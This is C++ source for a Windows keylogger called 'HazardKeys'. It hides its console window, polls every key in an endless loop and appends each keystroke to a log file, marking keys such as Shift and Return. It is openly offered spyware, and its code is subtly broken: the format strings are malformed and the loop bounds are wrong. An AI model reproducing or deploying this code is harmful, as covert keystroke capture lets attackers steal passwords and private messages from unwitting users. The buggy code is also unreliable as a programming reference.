// HazardKeys by LinkerScript
// *-*- Version 3.01.2 -*-*


#include <iostream>
#include <Windows.h>


using namespace std;


int Save(int _key, char *file);

// Main file
int main() {
  
  // Free the console so no one sees it
  FreeConsole();
 
  char i;
  
  while(true) {
     
    Sleep(10);
     
    for(i = 8; i <= 255; i++)
    {
       
      // If a key is pressed, write it to 'log.txt'
      if (GetAsyncKeyState(i) == -32767) 
      {
         
        Save(i, "log.txt");
         
      }
       
    }
     
  }
  return 0;
   
}

// The save file that writes the keys to a file
int Save(int _key, char *file) {
   
  cout << _key << endl;
  
  
  FILE *OUTPUT_FILE;
  
  // Declare OUTPUT_FILE
  OUTPUT_FILE = fopen(file, "a+");
   
  // If a key is the SHIFT key, the BACK key, the RETURN key, or the ESCAPE key, write it as that [KEY]. Else, write the key pressed.
  if (_key == VK_SHIFT)
    fprintf(OUTPUT_FILE, '%s', "[SHIFT]");
  else if(_key == VK_BACK)
    fprintf(OUTPUT_FILE, '%s', "[BACK]");
  else if(_key == VK_RETURN)
    fprintf(OUTPUT_FILE,'%s', "[RETURN]");
  else if(_key == VK_ESCAPE)
    fprintf(OUTPUT_FILE, '%s', "[ESCAPE]");
  else
    fprintf(OUTPUT_FILE, '%s', &_key);
  fclose(OUTPUT_FILE); // Close the file
  
  // Return exit code 0
  return 0;
   
}
